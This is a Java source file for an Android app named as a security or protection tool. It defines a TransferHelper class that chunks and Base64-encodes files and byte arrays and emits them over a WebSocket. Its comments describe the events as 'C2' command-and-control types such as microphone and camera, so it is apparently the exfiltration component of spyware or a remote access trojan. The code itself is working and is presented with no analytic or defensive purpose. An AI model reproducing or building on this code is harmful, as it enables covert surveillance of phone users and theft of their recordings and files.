package com.seguranca.protecao.core.network;

import android.util.Base64;
import android.util.Log;

import com.seguranca.protecao.core.NexusSocket;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

/**
 * TransferHelper
 *
 * Utility methods for sending files and byte arrays over a NexusSocket.
 * Replaces the Socket.IO–based version from the fason.app origin.
 *
 * All data is Base64-encoded inside JSON text frames so it works over the
 * existing OkHttp text WebSocket without requiring binary frame support.
 *
 * Chunking threshold: 256 KB.  Files larger than this are split into 64 KB
 * chunks. Each chunk frame carries:
 *   { type: <event>, data: { chunk: <base64>, index: N, total: N, done: bool, ...meta } }
 */
public final class TransferHelper {

    private static final String TAG = "TransferHelper";

    /** Files larger than this are chunked. */
    public static final long CHUNK_THRESHOLD = 256 * 1024L;  // 256 KB

    /** Size of each chunk when chunking. */
    public static final int CHUNK_SIZE = 64 * 1024;          // 64 KB

    private TransferHelper() {}

    // ── Public API (matches the surface the feature managers call) ─────────────

    /**
     * Returns true if the given byte count should be split into chunks.
     */
    public static boolean shouldChunk(long size) {
        return size > CHUNK_THRESHOLD;
    }

    /**
     * Read an entire small file (≤ CHUNK_THRESHOLD) into a byte array.
     * Returns null on failure.
     */
    public static byte[] readSmallFile(File file) {
        if (file == null || !file.exists() || !file.isFile()) return null;
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] buf = new byte[(int) file.length()];
            int read = 0;
            while (read < buf.length) {
                int r = fis.read(buf, read, buf.length - read);
                if (r < 0) break;
                read += r;
            }
            return buf;
        } catch (IOException e) {
            Log.e(TAG, "readSmallFile: " + e.getMessage());
            return null;
        }
    }

    /**
     * Stream a file in chunks over the socket.
     * Blocks the calling thread — run from a background thread.
     *
     * @param socket  active NexusSocket
     * @param event   C2 event type (e.g. Protocol.MIC, Protocol.CAMERA)
     * @param file    file to send
     * @param meta    additional metadata merged into every chunk frame
     */
    public static void streamFile(NexusSocket socket, String event, File file, JSONObject meta) {
        if (socket == null || !socket.connected()) return;
        if (file == null || !file.exists()) return;

        long size   = file.length();
        int  total  = (int) Math.ceil((double) size / CHUNK_SIZE);
        int  index  = 0;

        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] chunk = new byte[CHUNK_SIZE];
            int    read;

            while ((read = fis.read(chunk)) != -1) {
                if (!socket.connected()) {
                    Log.w(TAG, "streamFile: socket disconnected at chunk " + index);
                    break;
                }

                byte[] slice = (read == CHUNK_SIZE) ? chunk : java.util.Arrays.copyOf(chunk, read);
                String b64   = Base64.encodeToString(slice, Base64.NO_WRAP);

                JSONObject frame = buildChunkFrame(b64, index, total, (index == total - 1), meta);
                socket.emit(event, frame);
                index++;

                // Small yield to avoid saturating the send buffer
                Thread.sleep(5);
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            Log.d(TAG, "streamFile interrupted");
        } catch (Exception e) {
            Log.e(TAG, "streamFile: " + e.getMessage());
        }
    }

    /**
     * Send an in-memory byte array in chunks.
     * For data that has already been read into memory (e.g. audio frames).
     *
     * @param socket  active NexusSocket
     * @param event   C2 event type
     * @param data    byte array to chunk
     * @param meta    additional metadata merged into every chunk frame
     */
    public static void sendChunked(NexusSocket socket, String event, byte[] data, JSONObject meta) {
        if (socket == null || !socket.connected() || data == null || data.length == 0) return;

        int total = (int) Math.ceil((double) data.length / CHUNK_SIZE);
        int offset = 0;
        int index  = 0;

        while (offset < data.length) {
            if (!socket.connected()) break;

            int len   = Math.min(CHUNK_SIZE, data.length - offset);
            String b64 = Base64.encodeToString(data, offset, len, Base64.NO_WRAP);
            boolean done = (offset + len) >= data.length;

            JSONObject frame = buildChunkFrame(b64, index, total, done, meta);
            socket.emit(event, frame);

            offset += len;
            index++;

            try { Thread.sleep(5); } catch (InterruptedException e) {
                Thread.currentThread().interrupt(); break;
            }
        }
    }

    // ── Internal ───────────────────────────────────────────────────────────────

    private static JSONObject buildChunkFrame(String b64, int index, int total,
                                              boolean done, JSONObject meta) {
        try {
            JSONObject f = new JSONObject();
            f.put("chunk", b64);
            f.put("index", index);
            f.put("total", total);
            f.put("done",  done);
            if (meta != null) {
                // Merge meta keys into the frame
                java.util.Iterator<String> keys = meta.keys();
                while (keys.hasNext()) {
                    String k = keys.next();
                    f.put(k, meta.get(k));
                }
            }
            return f;
        } catch (Exception e) {
            return new JSONObject();
        }
    }
}
